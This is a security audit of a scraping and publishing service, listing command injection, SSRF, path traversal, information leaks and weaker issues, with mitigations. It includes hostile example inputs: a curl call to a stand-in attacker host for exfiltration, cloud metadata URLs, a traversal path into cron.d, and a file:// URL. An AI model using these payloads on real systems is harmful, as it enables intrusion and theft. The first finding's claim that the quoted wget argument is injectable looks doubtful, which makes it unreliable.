# Security Audit — make-it-static

**Date**: 2026-05-26
**Scope**: api/, worker/, docker-compose.yml, .env.example
**Method**: Manual static analysis + code review

---

## Critical

### 1. Command Injection in `scrape.sh` via URL parameter

**File**: `worker/scrape.sh:48-65`
**Risk**: An authenticated attacker can execute arbitrary commands by crafting a malicious URL.

The URL is passed directly to `wget` without sanitization:

```bash
wget \
  --recursive \
  --domains="$HOST,$EXTRA_DOMAINS" \
  --reject-regex '(/wp-admin/|...)' \
  "$URL"
```

A payload like `https://example.com/; curl attacker.com/exfil` would execute `curl` after `wget` fails. Even though `set -euo pipefail` is set, the `||` block catches the error and execution continues.

**Mitigation**: Validate URL scheme (http/https only) and hostname before passing to `wget`. Consider using `urllib.parse` to extract and validate components.

---

### 2. Server-Side Request Forgery (SSRF) via `/publish` endpoint

**File**: `worker/jobs.py:260-295`, `worker/scrape.sh`
**Risk**: Authenticated attacker can make the server request internal services (AWS metadata, Redis, etc.).

The `url` parameter is passed to `wget` with `--span-hosts --domains=...`. While `--domains` limits which hosts are followed recursively, the **initial request** goes to whatever URL is provided. This means:
- `http://169.254.169.254/latest/meta-data/` (AWS IMDS)
- `http://minio:9000/` (internal MinIO)
- `http://redis:6379/` (Redis, though wget would fail)

The `download_dynamic_cdn_assets`, `download_webpack_chunks`, and `download_elementor_dynamic_assets` functions all make additional HTTP requests based on content found in downloaded files, amplifying the SSRF surface.

**Mitigation**: Validate the URL hostname against an allowlist of permitted origins. Reject internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254).

---

### 3. Path Traversal in `download_dynamic_cdn_assets`

**File**: `worker/jobs.py:60-114`
**Risk**: An attacker can write files outside the intended work directory.

```python
local_path = workdir / url_path.lstrip("/")
```

If a CDN URL contains path traversal (`https://cdn.com/../../etc/cron.d/backdoor`), the `url_path` becomes `../../etc/cron.d/backdoor`. Since `lstrip("/")` only removes leading slashes, `workdir / "../../etc/cron.d/backdoor"` resolves to `/etc/cron.d/backdoor` on most systems.

This affects:
- `download_dynamic_cdn_assets` (line 98)
- `download_webpack_chunks` (line 162)
- `download_elementor_dynamic_assets` (line 222)

**Mitigation**: Validate that the resolved path is within `workdir`:
```python
local_path = (workdir / url_path.lstrip("/")).resolve()
if not str(local_path).startswith(str(workdir.resolve())):
    continue  # reject path traversal
```

---

### 4. Command Injection in `postprocess.py` call via hostname

**File**: `worker/jobs.py:306`
**Risk**: Shell metacharacters in URL hostname are passed to subprocess.

```python
postprocess = _run(["python", "/app/postprocess.py", str(workdir), hostname] + extra_cdn)
```

While this uses `list[str]` (safe from shell injection), the `hostname` is extracted from the URL via `urlparse(url).hostname`. A URL like `https://evil.com;id>/dev/null` could produce unexpected hostnames. However, since it's passed as a list element, shell injection is not possible here. **Downgraded to MEDIUM** — the real risk is if `_run` is ever refactored to use `shell=True`.

---

## High

### 5. Information Disclosure via `exc_info` in job status

**File**: `api/main.py:148-156`
**Risk**: Job status endpoint leaks internal paths and exception details.

```python
return {
    "id": job.id,
    "status": job.get_status(),
    "result": job.result,
    "error": str(job.exc_info) if job.exc_info else None,
    ...
}
```

If a job fails with an exception, the full traceback (including file paths, function names, and potentially environment details) is exposed to any client that queries `/jobs/{job_id}`. No authentication is required for this endpoint.

**Mitigation**: Log full tracebacks server-side. Return only a generic error message to clients:
```python
"error": "Job failed — check server logs" if job.exc_info else None
```

---

### 6. Open CORS in Production

**File**: `api/main.py:30-35`
**Risk**: Any website can make cross-origin requests to the API.

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["POST", "GET", "DELETE"],
    allow_headers=["*"],
)
```

While the HMAC signature prevents unauthorized publishes, the open CORS increases the attack surface for:
- Timing attacks on HMAC verification
- DoS via preflight requests
- Information leakage via `/jobs/{id}` and `/health`

**Mitigation**: Make CORS origins configurable via environment variable:
```python
allow_origins=os.environ.get("CORS_ORIGINS", "*").split(",")
```

---

### 7. Health Endpoint Information Leakage

**File**: `api/main.py:57-64`
**Risk**: `/health` exposes infrastructure topology.

```python
@app.get("/health")
def health():
    try:
        redis_conn.ping()
        redis_ok = True
    except Exception:
        redis_ok = False
    return {"ok": True, "redis": redis_ok}
```

This endpoint is unauthenticated and reveals:
- Whether Redis is running
- Whether the API container is healthy
- Response times (can fingerprint the stack)

An attacker can use this for reconnaissance before an attack.

**Mitigation**: Consider adding a simple health check that doesn't expose Redis status, or rate-limit the endpoint.

---

### 8. No Rate Limiting on `/publish`

**File**: `api/main.py:67-117`
**Risk**: Authenticated attacker can enqueue unlimited jobs, causing DoS.

There is no rate limiting, IP blocking, or maximum queue depth check. An attacker with a valid HMAC secret can:
- Flood the queue with thousands of jobs
- Exhaust worker resources
- Fill disk space in `/tmp/deploys`
- Cause CloudFront invalidation quota exhaustion

**Mitigation**: Add rate limiting (e.g., per-IP or per-post_id). Consider using a tool like `slowapi` or nginx rate limiting.

---

## Medium

### 9. Weak File Naming Hash (MD5)

**File**: `worker/optimize.py:28-29`
**Risk**: MD5 is cryptographically broken; collision attacks are trivial.

```python
def _file_hash(content: str) -> str:
    return hashlib.md5(content.encode("utf-8")).hexdigest()[:8]
```

While this is used for bundle filenames (not security), an attacker could intentionally craft colliding CSS/JS content to overwrite bundles. **Impact is low** because bundle names are only used for cache-busting.

**Mitigation**: Use SHA-256:
```python
return hashlib.sha256(content.encode("utf-8")).hexdigest()[:16]
```

---

### 10. `datetime.utcnow()` is Deprecated (Python 3.12)

**File**: `worker/jobs.py:275`
**Risk**: Future Python versions may remove this function.

```python
timestamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
```

**Mitigation**: Use `datetime.now(timezone.utc)`:
```python
from datetime import timezone
timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
```

---

### 11. No URL Scheme Validation

**File**: `api/main.py:81-84`
**Risk**: URL can use `file://`, `ftp://`, or other schemes.

```python
url = payload.get("url")
post_id = payload.get("post_id")
if not url or not post_id:
    raise HTTPException(status_code=400, detail="url and post_id required")
```

There is no check that `url` starts with `http://` or `https://`. A `file:///etc/passwd` URL would be passed to `wget`, which would attempt to read local files.

**Mitigation**:
```python
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.scheme not in ("http", "https"):
    raise HTTPException(status_code=400, detail="url must be http or https")
```

---

### 12. Race Condition in Workdir Cleanup

**File**: `worker/jobs.py:361-362`
**Risk**: Concurrent jobs with the same `post_id` and timestamp could interfere.

```python
finally:
    shutil.rmtree(workdir, ignore_errors=True)
```

The workdir name uses `datetime.utcnow()` with second precision. If two jobs for the same `post_id` start in the same second, they share the same directory. The `ignore_errors=True` suppresses errors, but files could be deleted while another job is still using them.

**Mitigation**: Add a random suffix or use nanosecond precision:
```python
import uuid
workdir = WORK_ROOT / f"{post_id}-{timestamp}-{uuid.uuid4().hex[:8]}"
```

---

### 13. Default Secrets in `.env.example`

**File**: `.env.example:8`
**Risk**: Developers may accidentally use weak secrets in production.

```bash
HMAC_SECRET=your-app-secret-key
```

This is a documented example, but the placeholder is weak. If someone copies this without changing it, the system is trivially bypassable.

**Mitigation**: Add a comment with a generation command and validate secret strength at startup:
```python
if len(SECRET) < 32:
    raise RuntimeError("HMAC_SECRET must be at least 32 characters")
```

---

## Low

### 14. Silenced Errors with `errors="ignore"`

**Files**: Multiple (`postprocess.py`, `optimize.py`, `jobs.py`)
**Risk**: Encoding errors are silently ignored, potentially causing data corruption.

```python
text = html_file.read_text(encoding="utf-8", errors="ignore")
```

If a file contains invalid UTF-8, the invalid bytes are dropped. This could corrupt URLs or content in unpredictable ways.

**Mitigation**: Use `errors="replace"` to preserve byte count, or log warnings when errors occur.

---

### 15. Worker Can Be Tricked into Downloading Malicious Content

**File**: `worker/scrape.sh:48-65`
**Risk**: `wget` follows redirects and downloads content from attacker-controlled servers.

An attacker can publish a URL that redirects to a malicious site. `wget` will follow the redirect and download the content, which is then processed and uploaded to S3. While the content is "just" HTML/JS/CSS, it could contain:
- XSS payloads (irrelevant for static sites, but...)
- Malformed content that crashes postprocess/optimize
- Extremely large files that fill disk space

**Mitigation**: Add `--max-redirect=3` and consider validating content type of downloaded files.

---

## Recommendations Summary

| Priority | Issue | Location | Action |
|----------|-------|----------|--------|
| CRITICAL | Command injection in `scrape.sh` | `worker/scrape.sh` | Sanitize URL before wget |
| CRITICAL | SSRF via URL parameter | `api/main.py`, `worker/jobs.py` | Validate URL against allowlist; block internal IPs |
| CRITICAL | Path traversal in downloads | `worker/jobs.py` | Validate resolved path is within workdir |
| HIGH | Information disclosure via exc_info | `api/main.py:152` | Return generic error to clients |
| HIGH | Open CORS in production | `api/main.py:30` | Make origins configurable via env var |
| HIGH | No rate limiting | `api/main.py:67` | Add rate limiting to `/publish` |
| MEDIUM | Weak hash (MD5) | `worker/optimize.py:28` | Use SHA-256 |
| MEDIUM | No URL scheme validation | `api/main.py:81` | Reject non-http/https URLs |
| MEDIUM | Race condition in workdir | `worker/jobs.py:275` | Add UUID suffix to workdir name |
| MEDIUM | Deprecated `utcnow()` | `worker/jobs.py:275` | Use `datetime.now(timezone.utc)` |
| LOW | Default weak secret | `.env.example:8` | Add generation command + startup validation |
